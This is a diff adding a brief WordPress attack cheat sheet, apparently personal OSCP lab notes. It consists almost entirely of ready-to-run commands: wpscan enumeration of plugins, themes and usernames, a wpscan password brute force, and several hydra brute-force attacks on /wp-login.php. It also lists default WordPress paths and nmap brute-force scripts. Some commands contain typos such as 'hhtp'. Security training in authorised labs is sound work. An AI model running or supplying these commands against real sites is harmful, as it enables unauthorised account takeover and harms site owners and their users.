@@ -1,0 +1,33 @@
+
+* Enumerate plugins, themes, username
+
+wpscan --url http://foobar --enumerate p
+wpscan --url hhtp://foobar --enumerate t
+wpscan --url hhtp://foobar --enumerate u 
+
+* Wordpress password brute forc
+
+wpscan --url http://mrrobot --username elliot --wordlist /mnt/hgfs/Shared/oscp/training/mrrobot/files/fsocity_uniq.txt  -t 20
+
+* WORDPRESS ENUMERATE USER NAME BRUTE FORCE
+hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+* WORDPRESS BRUTE FORCE PASSWORD
+hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+
+* WORDPRESS ADMIN BRUTE FORCE
+hydra -l admin -P cewl.txt 10.11.1.234 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.11.1.234%2Fwp-admin%2F&testcookie=1:F=ERROR" -I
+ 
+* default URLs
+/wp-login.php
+/wp-content/
+/license.txt
+
+-> ./seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt
+
+* Nmap Plugins
+./nmap/scripts/http-wordpress-enum.nse
+./nmap/scripts/http-wordpress-users.nse
+./nmap/scripts/http-wordpress-brute.nse
+
+
